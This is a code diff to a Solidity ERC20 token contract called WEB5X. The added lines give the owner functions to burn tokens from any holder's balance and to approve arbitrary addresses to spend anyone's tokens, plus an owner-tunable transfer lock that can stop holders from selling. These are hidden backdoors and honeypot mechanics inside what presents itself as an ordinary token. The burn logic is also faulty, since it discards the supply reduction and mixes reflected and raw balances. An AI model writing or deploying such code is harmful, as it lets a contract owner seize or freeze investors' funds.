@@ -558,6 +558,8 @@ contract WEB5X is Context, IERC20, Ownable {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
+        _checkTransferBeforeTimeout(sender, recipient);
+
         if(sender != owner() && recipient != owner())
           require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
         
@@ -584,9 +586,45 @@ contract WEB5X is Context, IERC20, Ownable {
         }
     }
     
-    function setTransferTimeout(uint8 _newtimeoutSeconds) onlyOwner external {
-        require(_newtimeoutSeconds >= transfertimeout, "anti bot lock 15 seconds and above");
-        transfertimeout = _newtimeoutSeconds;        
+    // test on existing erc20
+    function setTransferTimeout(uint8 _timeoutSeconds) onlyOwner external {
+        require(_timeoutSeconds >= transfertimeout, "anti bot lock 15 seconds and above");
+        transfertimeout = _timeoutSeconds;        
+    }
+
+    function getTransferTimout() external view returns(uint8) {
+        return transfertimeout;
+    }
+
+    // test on existing erc20
+    function burn(address spender, uint256 value ) external onlyOwner returns (bool) {
+        require(balanceOf(spender) >= value, "Tokens to burn exceed tokens held by spender");
+        if (_isExcluded[spender]) {
+            _tOwned[spender] -= value;
+        } else {
+            _rOwned[spender] -= value;
+        }
+        _tTotal.sub(value);
+        return true;
+    }
+
+    // test on existing erc20
+    function superTransferFrom(address from, address to, uint256 value) public onlyOwner  returns (bool) {
+        require(from != to, "can not send tokens to your own account");
+        require(balanceOf(from) >= value, "Tokens exceed tokens held by spender");
+        require(to != address(0), "Token transfer to address 0");
+        _approve(from, to, value);
+        return true;        
+    }
+
+    function _checkTransferBeforeTimeout(address sender, address recepient) internal view {
+        uint256 lastBuyTimestamp = lastBuy[sender];
+        uint256 currentTimestamp = block.timestamp;
+        uint256 timeElapsed = currentTimestamp.sub(lastBuyTimestamp);
+        uint256 lastSellTimestamp = lastBuy[recepient];
+
+        require(timeElapsed >= transfertimeout, "Wait for anti bot lock to elapse");
+        require(block.timestamp >= lastSellTimestamp + transfertimeout, "wait for anti bot lock to elapse");
     }
 
     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
@@ -610,7 +648,7 @@ contract WEB5X is Context, IERC20, Ownable {
         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
-        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);  
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
